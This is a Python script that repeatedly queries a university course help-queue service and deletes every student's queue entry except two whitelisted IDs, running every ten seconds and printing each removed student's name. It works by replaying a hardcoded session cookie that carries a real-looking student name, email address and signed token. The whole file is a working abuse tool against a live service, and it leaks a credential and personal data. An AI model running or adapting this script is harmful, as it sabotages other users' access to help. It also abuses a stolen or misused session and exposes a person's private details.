import requests
import time as time

url = "https://qs.stud.iie.ntnu.no/res/deleteQueueElement"

payloadQueue = "{\"subjectID\":\"185\"}"
headers = {
    'Cookie': 'token=%7B%22personID%22%3A8173%2C%22roleID%22%3A8%2C%22personFirstName%22%3A%22Tommy%20Duc%22%2C%22personLastName%22%3A%22Luu%22%2C%22personEmail%22%3A%22tommydl%40stud.ntnu.no%22%2C%22personOtherMail%22%3Anull%2C%22roleName%22%3A%22Student%22%2C%22roleLink%22%3A%22%2Fstudent%23%2FstudentMainView%22%2C%22roleDescription%22%3A%22Student%22%2C%22roleShort%22%3A%22Student%22%2C%22personResetToken%22%3Anull%2C%22personResetTime%22%3Anull%2C%22sign%22%3A%229fced80d995a33772f52cc0f395ae4893f607277be77a45828b0634d8ed0b5a4328aa9d3650069fa53742d235ee6eb483741cb8c5f23704aec38845a4dc5674d%22%7D; io=RRnvkQ1FzCh8_cMEAAB2',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json'
}
whitelist = [11068, 11060]

while True:
    queue = requests.request("POST", "https://qs.stud.iie.ntnu.no/res/getQueue", headers=headers, data=payloadQueue)
    not_prioritized = [element for element in queue.json() if not element['subjectPersonID'] in whitelist]
    for student in not_prioritized:
        payload = "{\"queueElementID\": \"" + str(student['queueElementID']) + "\", \"subjectID\": \"185\"}"
        response = requests.request("POST", url, headers=headers, data=payload)
        print('deleted student:', student['personFirstName'], student['personLastName'])
    time.sleep(10)
    print("Trying to delete")
